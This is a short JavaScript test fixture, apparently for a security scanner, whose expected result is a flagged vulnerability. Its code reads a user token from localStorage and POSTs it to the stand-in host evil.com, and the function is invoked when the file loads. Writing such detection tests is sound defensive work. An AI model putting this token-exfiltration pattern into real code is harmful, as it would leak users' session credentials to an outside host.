/**
 * Test: Data exfiltration via fetch body
 * Expected: VULNERABILITY - localStorage to fetch
 */

function test() {
  var data = localStorage.getItem('userToken');
  fetch('https://evil.com/api', {
    method: 'POST',
    body: JSON.stringify({ stolen: data })
  });
}

test();
